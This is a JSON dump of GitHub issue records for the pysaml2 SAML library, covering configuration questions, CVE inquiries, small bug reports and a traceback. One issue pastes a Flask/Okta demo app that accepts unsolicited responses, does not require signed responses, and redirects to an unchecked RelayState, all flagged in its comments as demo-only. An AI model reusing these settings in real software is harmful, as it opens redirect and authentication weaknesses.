"received_events_url": "https://api.github.com/users/ksshetty/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 5605570, "node_id": "MDU6TGFiZWw1NjA1NTcw", "url": "https://api.github.com/repos/IdentityPython/pysaml2/labels/question", "name": "question", "color": "cc317c", "default": true, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-03-13T18:34:41Z", "updated_at": "2018-03-13T22:41:38Z", "closed_at": "2018-03-13T22:17:23Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi folks,\r\n\r\nI have been successfully been able to use the pysaml2 library to write an SP application that integrates with a handful of IdPs. I have two questions:\r\n\r\n1. One of the IdPs wants access to the SP metadata and I wasn't sure how to generate/share this info to provide to the IdP. I found some good info on the following URL but I didn't understand how to generate the metadata: [link to documentation](https://github.com/IdentityPython/pysaml2/blob/master/doc/howto/config.rst)\r\n\r\n2. I notice the `authn_requests_signed` attribute can be used to sign the requests made from the SP side. In order to do this, the SP needs to sign the request using the private key and share the public key with the IdP. But what was not clear to me is how does the library look for the cert on the SP side? [link to documentation](https://github.com/IdentityPython/pysaml2/blob/master/doc/howto/config.rst#authn-requests-signed)\r\n\r\nAny help or pointers will be greatly appreciated. Thanks in advance.\r\n\r\nKarthik", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/497", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/497/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/497/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/497/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/497", "id": 300755255, "node_id": "MDU6SXNzdWUzMDA3NTUyNTU=", "number": 497, "title": "Is pysaml2 affected by CVE-2017-11427?", "user": {"login": "johnwheeler", "id": 6809734, "node_id": "MDQ6VXNlcjY4MDk3MzQ=", "avatar_url": "https://avatars3.githubusercontent.com/u/6809734?v=4", "gravatar_id": "", "url": "https://api.github.com/users/johnwheeler", "html_url": "https://github.com/johnwheeler", "followers_url": "https://api.github.com/users/johnwheeler/followers", "following_url": "https://api.github.com/users/johnwheeler/following{/other_user}", "gists_url": "https://api.github.com/users/johnwheeler/gists{/gist_id}", "starred_url": "https://api.github.com/users/johnwheeler/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/johnwheeler/subscriptions", "organizations_url": "https://api.github.com/users/johnwheeler/orgs", "repos_url": "https://api.github.com/users/johnwheeler/repos", "events_url": "https://api.github.com/users/johnwheeler/events{/privacy}", "received_events_url": "https://api.github.com/users/johnwheeler/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2018-02-27T19:08:16Z", "updated_at": "2018-08-31T19:09:13Z", "closed_at": "2018-08-31T19:09:13Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello,\r\n\r\nJust a quick sanity check to ensure pysaml2 isn't affected by the SAML vulnerabilities announced:\r\n\r\nhttps://www.kb.cert.org/vuls/id/475445\r\n\r\nThe note does not mention pysaml2, but it would be great to hear it from the horse's mouth.\r\n\r\nI apologize if this is not the appropriate venue for this type of query.\r\n\r\nJohn", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/496", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/496/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/496/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/496/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/496", "id": 300754515, "node_id": "MDU6SXNzdWUzMDA3NTQ1MTU=", "number": 496, "title": "Is pysaml2 vulnerable to CVE-2017-11427 ?", "user": {"login": "GertBurger", "id": 23653, "node_id": "MDQ6VXNlcjIzNjUz", "avatar_url": "https://avatars2.githubusercontent.com/u/23653?v=4", "gravatar_id": "", "url": "https://api.github.com/users/GertBurger", "html_url": "https://github.com/GertBurger", "followers_url": "https://api.github.com/users/GertBurger/followers", "following_url": "https://api.github.com/users/GertBurger/following{/other_user}", "gists_url": "https://api.github.com/users/GertBurger/gists{/gist_id}", "starred_url": "https://api.github.com/users/GertBurger/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/GertBurger/subscriptions", "organizations_url": "https://api.github.com/users/GertBurger/orgs", "repos_url": "https://api.github.com/users/GertBurger/repos", "events_url": "https://api.github.com/users/GertBurger/events{/privacy}", "received_events_url": "https://api.github.com/users/GertBurger/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-02-27T19:05:55Z", "updated_at": "2018-03-01T09:34:57Z", "closed_at": "2018-03-01T09:34:57Z", "author_association": "NONE", "active_lock_reason": null, "body": "Please see https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations for more information.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/492", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/492/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/492/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/492/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/492", "id": 297281001, "node_id": "MDU6SXNzdWUyOTcyODEwMDE=", "number": 492, "title": "validate.validate_before() using minute for formatting instead of month", "user": {"login": "brock-bouchard", "id": 422647, "node_id": "MDQ6VXNlcjQyMjY0Nw==", "avatar_url": "https://avatars2.githubusercontent.com/u/422647?v=4", "gravatar_id": "", "url": "https://api.github.com/users/brock-bouchard", "html_url": "https://github.com/brock-bouchard", "followers_url": "https://api.github.com/users/brock-bouchard/followers", "following_url": "https://api.github.com/users/brock-bouchard/following{/other_user}", "gists_url": "https://api.github.com/users/brock-bouchard/gists{/gist_id}", "starred_url": "https://api.github.com/users/brock-bouchard/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/brock-bouchard/subscriptions", "organizations_url": "https://api.github.com/users/brock-bouchard/orgs", "repos_url": "https://api.github.com/users/brock-bouchard/repos", "events_url": "https://api.github.com/users/brock-bouchard/events{/privacy}", "received_events_url": "https://api.github.com/users/brock-bouchard/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-02-14T23:21:16Z", "updated_at": "2018-02-15T09:40:08Z", "closed_at": "2018-02-15T09:40:08Z", "author_association": "NONE", "active_lock_reason": null, "body": "https://github.com/rohe/pysaml2/blob/216118a3eea057a145c1c08dc5c6b3949c742467/src/saml2/validate.py#L108\r\n\r\nOne just needs to change...\r\n\r\n```python\r\nnow_str = time.strftime('%Y-%M-%dT%H:%M:%SZ', time.gmtime(now))\r\n```\r\n\r\n... to ...\r\n\r\n```python\r\nnow_str = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(now))\r\n```\r\n\r\nI tried to push a branch with the fix and open a PR but I didn't have permission.\r\n\r\nIt's not a huge deal but it definitely threw me for a loop reading my logs \ud83d\ude43 \r\n\r\nThanks for all of the work on this library and please advise if there is anything more I can do to help with this issue!", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/490", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/490/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/490/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/490/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/490", "id": 293372569, "node_id": "MDU6SXNzdWUyOTMzNzI1Njk=", "number": 490, "title": "Signature error: Signature missing for response", "user": {"login": "rkkrishnaa", "id": 12747331, "node_id": "MDQ6VXNlcjEyNzQ3MzMx", "avatar_url": "https://avatars1.githubusercontent.com/u/12747331?v=4", "gravatar_id": "", "url": "https://api.github.com/users/rkkrishnaa", "html_url": "https://github.com/rkkrishnaa", "followers_url": "https://api.github.com/users/rkkrishnaa/followers", "following_url": "https://api.github.com/users/rkkrishnaa/following{/other_user}", "gists_url": "https://api.github.com/users/rkkrishnaa/gists{/gist_id}", "starred_url": "https://api.github.com/users/rkkrishnaa/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/rkkrishnaa/subscriptions", "organizations_url": "https://api.github.com/users/rkkrishnaa/orgs", "repos_url": "https://api.github.com/users/rkkrishnaa/repos", "events_url": "https://api.github.com/users/rkkrishnaa/events{/privacy}", "received_events_url": "https://api.github.com/users/rkkrishnaa/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2018-02-01T01:29:46Z", "updated_at": "2018-02-12T13:31:10Z", "closed_at": "2018-02-12T13:31:10Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello, \r\n\r\nUnable to validate Idp and Sp\r\n\r\nI am using the application available under examples idp2 and sp-wsgi to validate idp and sp. I am getting error `Signature error: Signature missing for response`\r\n\r\nReplaced base url with my ip and update HOST with my ip. I have generated a new server key based on my hostname updated configuration file `examples/idp2/idp_conf.py` `SERVER_CERT` and `SERVER_KEY`.\r\n\r\nSaml server throws 500 Internal server err. Is there any way to fix the issue. \r\n\r\n> _idp.log_:\r\n> ```\r\n> 2018-02-01 01:27:24,593 saml2.idp:ERROR An error occured while creating metadata: 'NoneType' object has no attribute '__getitem__'\r\n> ```\r\n\r\nBest Regards,\r\nRadhakrishnan Rk\r\n\r\n\r\n\r\n\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/481", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/481/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/481/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/481/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/481", "id": 280370007, "node_id": "MDU6SXNzdWUyODAzNzAwMDc=", "number": 481, "title": "Large python package on pypi", "user": {"login": "ad-m", "id": 3618479, "node_id": "MDQ6VXNlcjM2MTg0Nzk=", "avatar_url": "https://avatars1.githubusercontent.com/u/3618479?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ad-m", "html_url": "https://github.com/ad-m", "followers_url": "https://api.github.com/users/ad-m/followers", "following_url": "https://api.github.com/users/ad-m/following{/other_user}", "gists_url": "https://api.github.com/users/ad-m/gists{/gist_id}", "starred_url": "https://api.github.com/users/ad-m/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ad-m/subscriptions", "organizations_url": "https://api.github.com/users/ad-m/orgs", "repos_url": "https://api.github.com/users/ad-m/repos", "events_url": "https://api.github.com/users/ad-m/events{/privacy}", "received_events_url": "https://api.github.com/users/ad-m/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2017-12-08T04:48:05Z", "updated_at": "2018-07-06T18:39:21Z", "closed_at": "2018-07-06T18:39:21Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello,\r\n\r\nOn [pypi](https://pypi.python.org/pypi/pysaml2) there is package ``pysaml2-4.5.0.tar.gz`` which size is 19MB. This is relatively much, considering the small amount of actual code. The tests weigh about 95% of the archive. Most library users who install it via pypi do not need any tests at all. \r\nI suggest:\r\n\r\n- install wheel on deployment machine (```pip install wheel```),\r\n-  use ``bdist`` command when prepare a new release,\r\n- read https://docs.python.org/3.6/distutils/builtdist.html .\r\n\r\nI recommend using following build & release command:\r\n```\r\npython setup.py dist upload;\r\npython setup.py bdist bdist_wheel upload;\r\n```\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/478", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/478/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/478/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/478/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/478", "id": 274328572, "node_id": "MDU6SXNzdWUyNzQzMjg1NzI=", "number": 478, "title": "Current documentation version is still either outdated or release variable is still incorrect", "user": {"login": "gene1wood", "id": 1134034, "node_id": "MDQ6VXNlcjExMzQwMzQ=", "avatar_url": "https://avatars0.githubusercontent.com/u/1134034?v=4", "gravatar_id": "", "url": "https://api.github.com/users/gene1wood", "html_url": "https://github.com/gene1wood", "followers_url": "https://api.github.com/users/gene1wood/followers", "following_url": "https://api.github.com/users/gene1wood/following{/other_user}", "gists_url": "https://api.github.com/users/gene1wood/gists{/gist_id}", "starred_url": "https://api.github.com/users/gene1wood/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/gene1wood/subscriptions", "organizations_url": "https://api.github.com/users/gene1wood/orgs", "repos_url": "https://api.github.com/users/gene1wood/repos", "events_url": "https://api.github.com/users/gene1wood/events{/privacy}", "received_events_url": "https://api.github.com/users/gene1wood/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 5605568, "node_id": "MDU6TGFiZWw1NjA1NTY4", "url": "https://api.github.com/repos/IdentityPython/pysaml2/labels/enhancement", "name": "enhancement", "color": "84b6eb", "default": true, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2017-11-15T22:32:22Z", "updated_at": "2017-11-16T12:22:33Z", "closed_at": "2017-11-16T12:22:33Z", "author_association": "NONE", "active_lock_reason": null, "body": "Continuation from Ticket #328 \r\n\r\nCurrently, the docs have a release variable of [1.2.0beta](https://github.com/rohe/pysaml2/blob/9c04dc7ebbae1791b4234bc0f4f2949f1fe9f3c4/doc/conf.py#L52). Are the docs out of date (and not in sync with the current release of pysaml2 (version `4.5.0`)? Or are the docs up to date and the release variable is wrong?\r\n\r\nThe impact of this is that when searching for and [viewing the docs](https://pysaml2.readthedocs.org/en/latest/) they show as being for a very different version of the code than the user would be using. This version (`1.2.0beta`) shows up both in the docs and in search results pointing to the docs.\r\n\r\nThe end result is that when the users searches for docs for pysaml2 `4.5.0`, they only find docs for `1.2.0beta` which is confusing.\r\n\r\nThe version number in the docs is [1.2.0beta](https://github.com/rohe/pysaml2/blob/9c04dc7ebbae1791b4234bc0f4f2949f1fe9f3c4/doc/conf.py#L52). There haven't been any commits that would change the version number since @rohe [set the version in October 2014](https://github.com/rohe/pysaml2/commit/f05587c9111297ec591755382a71f1ea66cc8015). The intent of this value is to be \"[the major project version](http://www.sphinx-doc.org/en/stable/config.html#confval-version)\" of the software for which the documentation applies.\r\n\r\nSo assuming the documentation in the head of master applies to the current [version `4.5.0`](https://github.com/rohe/pysaml2/blob/847e970c5af6a09de61307be3a3d0305eee131f7/src/saml2/__init__.py#L20) of pysaml2, then the \"version\" and \"[release](http://www.sphinx-doc.org/en/stable/config.html#confval-release)\" values should be `4.5.0`\r\n\r\nFixes for this are either\r\n* Set the `version` and `release` variables in `conf.py` to the value in [`src/saml/__init__.py`](https://github.com/rohe/pysaml2/blob/847e970c5af6a09de61307be3a3d0305eee131f7/src/saml2/__init__.py#L20)\r\n* Set the `version` and `release` variables in `conf.py` to `''`", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/474", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/474/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/474/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/474/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/474", "id": 272653776, "node_id": "MDU6SXNzdWUyNzI2NTM3NzY=", "number": 474, "title": "SigverError: Can't find ['xmlsec1'] when running pysaml2 4.5.0 on ubuntu 16.04", "user": {"login": "andylockran", "id": 1412591, "node_id": "MDQ6VXNlcjE0MTI1OTE=", "avatar_url": "https://avatars0.githubusercontent.com/u/1412591?v=4", "gravatar_id": "", "url": "https://api.github.com/users/andylockran", "html_url": "https://github.com/andylockran", "followers_url": "https://api.github.com/users/andylockran/followers", "following_url": "https://api.github.com/users/andylockran/following{/other_user}", "gists_url": "https://api.github.com/users/andylockran/gists{/gist_id}", "starred_url": "https://api.github.com/users/andylockran/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/andylockran/subscriptions", "organizations_url": "https://api.github.com/users/andylockran/orgs", "repos_url": "https://api.github.com/users/andylockran/repos", "events_url": "https://api.github.com/users/andylockran/events{/privacy}", "received_events_url": "https://api.github.com/users/andylockran/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 5605569, "node_id": "MDU6TGFiZWw1NjA1NTY5", "url": "https://api.github.com/repos/IdentityPython/pysaml2/labels/invalid", "name": "invalid", "color": "e6e6e6", "default": true, "description": null}], "state": "closed", "locked": false, "assignee": {"login": "skoranda", "id": 687301, "node_id": "MDQ6VXNlcjY4NzMwMQ==", "avatar_url": "https://avatars0.githubusercontent.com/u/687301?v=4", "gravatar_id": "", "url": "https://api.github.com/users/skoranda", "html_url": "https://github.com/skoranda", "followers_url": "https://api.github.com/users/skoranda/followers", "following_url": "https://api.github.com/users/skoranda/following{/other_user}", "gists_url": "https://api.github.com/users/skoranda/gists{/gist_id}", "starred_url": "https://api.github.com/users/skoranda/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/skoranda/subscriptions", "organizations_url": "https://api.github.com/users/skoranda/orgs", "repos_url": "https://api.github.com/users/skoranda/repos", "events_url": "https://api.github.com/users/skoranda/events{/privacy}", "received_events_url": "https://api.github.com/users/skoranda/received_events", "type": "User", "site_admin": false}, "assignees": [{"login": "skoranda", "id": 687301, "node_id": "MDQ6VXNlcjY4NzMwMQ==", "avatar_url": "https://avatars0.githubusercontent.com/u/687301?v=4", "gravatar_id": "", "url": "https://api.github.com/users/skoranda", "html_url": "https://github.com/skoranda", "followers_url": "https://api.github.com/users/skoranda/followers", "following_url": "https://api.github.com/users/skoranda/following{/other_user}", "gists_url": "https://api.github.com/users/skoranda/gists{/gist_id}", "starred_url": "https://api.github.com/users/skoranda/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/skoranda/subscriptions", "organizations_url": "https://api.github.com/users/skoranda/orgs", "repos_url": "https://api.github.com/users/skoranda/repos", "events_url": "https://api.github.com/users/skoranda/events{/privacy}", "received_events_url": "https://api.github.com/users/skoranda/received_events", "type": "User", "site_admin": false}], "milestone": null, "comments": 2, "created_at": "2017-11-09T17:31:27Z", "updated_at": "2019-06-18T09:56:23Z", "closed_at": "2017-11-09T17:38:30Z", "author_association": "NONE", "active_lock_reason": null, "body": "I'm running a test app.py that looks like the following:\r\n\r\n```\r\n# -*- coding: utf-8 -*-\r\n# Copyright 2015 Okta, Inc.\r\n#\r\n# Licensed under the Apache License, Version 2.0 (the \"License\");\r\n# you may not use this file except in compliance with the License.\r\n# You may obtain a copy of the License at\r\n#\r\n#     http://www.apache.org/licenses/LICENSE-2.0\r\n#\r\n# Unless required by applicable law or agreed to in writing, software\r\n# distributed under the License is distributed on an \"AS IS\" BASIS,\r\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n# See the License for the specific language governing permissions and\r\n# limitations under the License.\r\nimport logging\r\nimport os\r\nimport uuid\r\n\r\nfrom flask import (\r\n    Flask,\r\n    redirect,\r\n    render_template,\r\n    request,\r\n    session,\r\n    url_for,\r\n)\r\nfrom flask.ext.login import (\r\n    LoginManager,\r\n    UserMixin,\r\n    current_user,\r\n    login_required,\r\n    login_user,\r\n    logout_user,\r\n)\r\nfrom flask_bootstrap import Bootstrap\r\nfrom saml2 import (\r\n    BINDING_HTTP_POST,\r\n    BINDING_HTTP_REDIRECT,\r\n    entity,\r\n)\r\nfrom saml2.client import Saml2Client\r\nfrom saml2.config import Config as Saml2Config\r\nimport requests\r\n\r\n# metadata_url_for contains PER APPLICATION configuration settings.\r\n# Each SAML service that you support will have different values here.\r\n#\r\n# NOTE:\r\n#   This is implemented as a dictionary for DEMONSTRATION PURPOSES ONLY.\r\n#   On a production system, this information should be stored as approprate\r\n#   for your concept of \"customer company\", \"group\", \"organization\", or \"team\"\r\nmetadata_url_for = {\r\n    # For testing with http://saml.oktadev.com use the following:\r\n    # 'test': 'http://idp.oktadev.com/metadata',\r\n    # WARNING WARNING WARNING\r\n    #   You MUST remove the testing IdP from a production system,\r\n    #   as the testing IdP will allow ANYBODY to log in as ANY USER!\r\n    # WARNING WARNING WARNING\r\n    'okta': 'https://oktatesturl\r\n    }\r\n\r\napp = Flask(__name__)\r\nBootstrap(app)\r\napp.secret_key = str(uuid.uuid4())  # Replace with your secret key\r\nlogin_manager = LoginManager()\r\nlogin_manager.setup_app(app)\r\nlogging.basicConfig(level=logging.DEBUG)\r\n# NOTE:\r\n#   This is implemented as a dictionary for DEMONSTRATION PURPOSES ONLY.\r\n#   On a production system, this information must come\r\n#   from your system's user store.\r\nuser_store = {}\r\n\r\n\r\ndef saml_client_for(idp_name=None):\r\n    '''\r\n    Given the name of an IdP, return a configuation.\r\n    The configuration is a hash for use by saml2.config.Config\r\n    '''\r\n\r\n    if idp_name not in metadata_url_for:\r\n        raise Exception(\"Settings for IDP '{}' not found\".format(idp_name))\r\n    acs_url = url_for(\r\n        \"idp_initiated\",\r\n        idp_name=idp_name,\r\n        _external=True)\r\n    https_acs_url = url_for(\r\n        \"idp_initiated\",\r\n        idp_name=idp_name,\r\n        _external=True,\r\n        _scheme='https')\r\n\r\n    #   SAML metadata changes very rarely. On a production system,\r\n    #   this data should be cached as approprate for your production system.\r\n    rv = requests.get(metadata_url_for[idp_name])\r\n\r\n    settings = {\r\n        'metadata': {\r\n            'inline': [rv.text],\r\n            },\r\n        'service': {\r\n            'sp': {\r\n                'endpoints': {\r\n                    'assertion_consumer_service': [\r\n                        (acs_url, BINDING_HTTP_REDIRECT),\r\n                        (acs_url, BINDING_HTTP_POST),\r\n                        (https_acs_url, BINDING_HTTP_REDIRECT),\r\n                        (https_acs_url, BINDING_HTTP_POST)\r\n                    ],\r\n                },\r\n                # Don't verify that the incoming requests originate from us via\r\n                # the built-in cache for authn request ids in pysaml2\r\n                'allow_unsolicited': True,\r\n                # Don't sign authn requests, since signed requests only make\r\n                # sense in a situation where you control both the SP and IdP\r\n                'authn_requests_signed': False,\r\n                'logout_requests_signed': True,\r\n                'want_assertions_signed': True,\r\n                'want_response_signed': False,\r\n            },\r\n        },\r\n    }\r\n    spConfig = Saml2Config()\r\n    spConfig.load(settings)\r\n    spConfig.allow_unknown_attributes = True\r\n    saml_client = Saml2Client(config=spConfig)\r\n    return saml_client\r\n\r\n\r\nclass User(UserMixin):\r\n    def __init__(self, user_id):\r\n        user = {}\r\n        self.id = None\r\n        self.first_name = None\r\n        self.last_name = None\r\n        try:\r\n            user = user_store[user_id]\r\n            self.id = unicode(user_id)\r\n            self.first_name = user['first_name']\r\n            self.last_name = user['last_name']\r\n        except:\r\n            pass\r\n\r\n\r\n@login_manager.user_loader\r\ndef load_user(user_id):\r\n    return User(user_id)\r\n\r\n\r\n@app.route(\"/\")\r\ndef main_page():\r\n    return render_template('main_page.html', idp_dict=metadata_url_for)\r\n\r\n\r\n@app.route(\"/saml/sso/<idp_name>\", methods=['POST'])\r\ndef idp_initiated(idp_name):\r\n    saml_client = saml_client_for(idp_name)\r\n    authn_response = saml_client.parse_authn_request_response(\r\n        request.form['SAMLResponse'],\r\n        entity.BINDING_HTTP_POST)\r\n    authn_response.get_identity()\r\n    user_info = authn_response.get_subject()\r\n    username = user_info.text\r\n\r\n    # This is what as known as \"Just In Time (JIT) provisioning\".\r\n    # What that means is that, if a user in a SAML assertion\r\n    # isn't in the user store, we create that user first, then log them in\r\n    if username not in user_store:\r\n        user_store[username] = {\r\n            'first_name': authn_response.ava['FirstName'][0],\r\n            'last_name': authn_response.ava['LastName'][0],\r\n            }\r\n    user = User(username)\r\n    session['saml_attributes'] = authn_response.ava\r\n    login_user(user)\r\n    url = url_for('user')\r\n    # NOTE:\r\n    #   On a production system, the RelayState MUST be checked\r\n    #   to make sure it doesn't contain dangerous URLs!\r\n    if 'RelayState' in request.form:\r\n        url = request.form['RelayState']\r\n    return redirect(url)\r\n\r\n\r\n@app.route(\"/saml/login/<idp_name>\")\r\ndef sp_initiated(idp_name):\r\n    saml_client = saml_client_for(idp_name)\r\n    reqid, info = saml_client.prepare_for_authenticate()\r\n\r\n    redirect_url = None\r\n    # Select the IdP URL to send the AuthN request to\r\n    for key, value in info['headers']:\r\n        if key is 'Location':\r\n            redirect_url = value\r\n    response = redirect(redirect_url, code=302)\r\n    # NOTE:\r\n    #   I realize I _technically_ don't need to set Cache-Control or Pragma:\r\n    #     http://stackoverflow.com/a/5494469\r\n    #   However, Section 3.2.3.2 of the SAML spec suggests they are set:\r\n    #     http://docs.oasis-open.org/security/saml/v2.0/saml-bindings-2.0-os.pdf\r\n    #   We set those headers here as a \"belt and suspenders\" approach,\r\n    #   since enterprise environments don't always conform to RFCs\r\n    response.headers['Cache-Control'] = 'no-cache, no-store'\r\n    response.headers['Pragma'] = 'no-cache'\r\n    return response\r\n\r\n\r\n@app.route(\"/user\")\r\n@login_required\r\ndef user():\r\n    return render_template('user.html', session=session)\r\n\r\n\r\n@app.errorhandler(401)\r\ndef error_unauthorized(error):\r\n    return render_template('unauthorized.html')\r\n\r\n\r\n@app.route(\"/logout\")\r\n@login_required\r\ndef logout():\r\n    logout_user()\r\n    return redirect(url_for(\"main_page\"))\r\n\r\nif __name__ == \"__main__\":\r\n    port = int(os.environ.get('PORT', 8080))\r\n    if port == 8080:\r\n        app.debug = True\r\n    app.run(host='0.0.0.0', port=port)\r\n```\r\n\r\nI get the following traceback from pysaml2:\r\n\r\n```\r\nTraceback (most recent call last):\r\n  File \"/usr/local/lib/python2.7/dist-packages/flask/app.py\", line 1836, in __call__\r\n    return self.wsgi_app(environ, start_response)\r\n  File \"/usr/local/lib/python2.7/dist-packages/flask/app.py\", line 1820, in wsgi_app\r\n    response = self.make_response(self.handle_exception(e))\r\n  File \"/usr/local/lib/python2.7/dist-packages/flask/app.py\", line 1403, in handle_exception\r\n    reraise(exc_type, exc_value, tb)\r\n  File \"/usr/local/lib/python2.7/dist-packages/flask/app.py\", line 1817, in wsgi_app\r\n    response = self.full_dispatch_request()\r\n  File \"/usr/local/lib/python2.7/dist-packages/flask/app.py\", line 1477, in full_dispatch_request\r\n    rv = self.handle_user_exception(e)\r\n  File \"/usr/local/lib/python2.7/dist-packages/flask/app.py\", line 1381, in handle_user_exception\r\n    reraise(exc_type, exc_value, tb)\r\n  File \"/usr/local/lib/python2.7/dist-packages/flask/app.py\", line 1475, in full_dispatch_request\r\n    rv = self.dispatch_request()\r\n  File \"/usr/local/lib/python2.7/dist-packages/flask/app.py\", line 1461, in dispatch_request\r\n    return self.view_functions[rule.endpoint](**req.view_args)\r\n  File \"/home/ubuntu/okta-pysaml2-example/app.py\", line 187, in sp_initiated\r\n    saml_client = saml_client_for(idp_name)\r\n  File \"/home/ubuntu/okta-pysaml2-example/app.py\", line 124, in saml_client_for\r\n    spConfig.load(settings)\r\n  File \"/usr/local/lib/python2.7/dist-packages/saml2/config.py\", line 356, in load\r\n    self.load_complex(cnf, metadata_construction=metadata_construction)\r\n  File \"/usr/local/lib/python2.7/dist-packages/saml2/config.py\", line 296, in load_complex\r\n    self.load_metadata(cnf[\"metadata\"]))\r\n  File \"/usr/local/lib/python2.7/dist-packages/saml2/config.py\", line 398, in load_metadata\r\n    disable_ssl_certificate_validation=disable_validation)\r\n  File \"/usr/local/lib/python2.7/dist-packages/saml2/mdstore.py\", line 850, in __init__\r\n    self.security = security_context(config)\r\n  File \"/usr/local/lib/python2.7/dist-packages/saml2/sigver.py\", line 1103, in security_context\r\n    xmlsec_binary = get_xmlsec_binary(_path)\r\n  File \"/usr/local/lib/python2.7/dist-packages/saml2/sigver.py\", line 203, in get_xmlsec_binary\r\n    raise SigverError(\"Can't find %s\" % bin_name)\r\nSigverError: Can't find ['xmlsec1']```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/473", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/473/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/473/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/473/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/473", "id": 272561071, "node_id": "MDU6SXNzdWUyNzI1NjEwNzE=", "number": 473, "title": "add url to docs to github project details", "user": {"login": "wbolster", "id": 748944, "node_id": "MDQ6VXNlcjc0ODk0NA==", "avatar_url": "https://avatars2.githubusercontent.com/u/748944?v=4", "gravatar_id": "", "url": "https://api.github.com/users/wbolster", "html_url": "https://github.com/wbolster", "followers_url": "https://api.github.com/users/wbolster/followers", "following_url": "https://api.github.com/users/wbolster/following{/other_user}", "gists_url": "https://api.github.com/users/wbolster/gists{/gist_id}", "starred_url": "https://api.github.com/users/wbolster/starred{/owner}{/repo}", 